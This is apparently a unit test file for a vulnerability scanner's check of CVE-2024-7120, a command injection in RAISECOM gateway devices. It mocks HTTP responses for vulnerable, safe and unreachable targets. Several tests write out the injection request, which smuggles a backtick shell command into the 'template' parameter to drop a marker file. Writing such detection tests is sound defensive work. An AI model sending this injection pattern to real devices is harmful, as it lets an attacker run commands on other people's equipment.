"""Unit tests for Agent Asteroid: CVE-2024-7120"""

import requests_mock as req_mock

from agent import definitions
from agent.exploits import cve_2024_7120


def testCVE20247120_whenVulnerable_reportsFinding(
    requests_mock: req_mock.Mocker,
) -> None:
    """CVE-2024-7120 unit test: case when the target is vulnerable."""

    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php",
        text="""
        <TITLE>Web user login</TITLE>
        <META content="MSHTML 6.00.2900.5583" name=GENERATOR></HEAD>
        """,
        status_code=200,
    )

    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php?type=mod&parts=base_config&template=`echo%20-e%20%27This%20is"
        "%20a%20Command%20Injection%27%20%3E%20/www/tmp/info.html`",
        status_code=200,
    )
    requests_mock.get(
        "http://example.com:80/tmp/info.html",
        status_code=200,
        text="This is a Command Injection",
    )

    exploit_instance = cve_2024_7120.CVE20247120Exploit()
    target = definitions.Target("http", "example.com", 80)

    assert exploit_instance.accept(target) is True
    vulnerabilities = exploit_instance.check(target)

    vulnerability = vulnerabilities[0]
    assert vulnerability.entry.title == "Command Injection in RAISECOM Gateway Devices"
    assert (
        vulnerability.technical_detail
        == "http://example.com:80 is vulnerable to CVE-2024-7120: Command Injection in RAISECOM Gateway Devices"
    )


def testCVE20247120_whenSafe_reportsNothing(
    requests_mock: req_mock.Mocker,
) -> None:
    """CVE-2024-7120 unit test: case when the target is safe."""

    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php",
        text="<html><head><title>Web user login</title><META content='MSHTML 6.00.2900.5583' "
        "name=GENERATOR></HEAD></html>",
    )
    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php?type=mod&parts=base_config&template=`echo%20-e%20%27This%20is"
        "%20a%20Command%20Injection%27%20%3E%20/www/tmp/info.html`",
        status_code=200,
    )
    requests_mock.get(
        "http://example.com:80/tmp/info.html",
        text="",
    )

    exploit_instance = cve_2024_7120.CVE20247120Exploit()
    target = definitions.Target("http", "example.com", 80)

    vulnerabilities = exploit_instance.check(target)
    assert len(vulnerabilities) == 0


def testCheck_whenEndpointUnreachable_reportError(
    requests_mock: req_mock.Mocker,
) -> None:
    """Test check method when the endpoint is unreachable."""
    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php",
        status_code=404,
    )

    exploit_instance = cve_2024_7120.CVE20247120Exploit()
    target = definitions.Target("http", "example.com", 80)

    assert exploit_instance.accept(target) is False


def testCheck_commandInjectionFails_reportError(requests_mock: req_mock.Mocker) -> None:
    """Test check method when the command injection fails."""

    requests_mock.get(
        "http://example.com:80/vpn/list_base_config.php?type=mod&parts=base_config&template=`echo%20-e%20%27This%20is"
        "%20a%20Command%20Injection%27%20%3E%20/www/tmp/info.html`",
        status_code=404,
    )

    requests_mock.get(
        "http://example.com:80/tmp/info.html",
        status_code=404,
    )

    exploit_instance = cve_2024_7120.CVE20247120Exploit()
    target = definitions.Target("http", "example.com", 80)

    vulnerabilities = exploit_instance.check(target)
    assert len(vulnerabilities) == 0
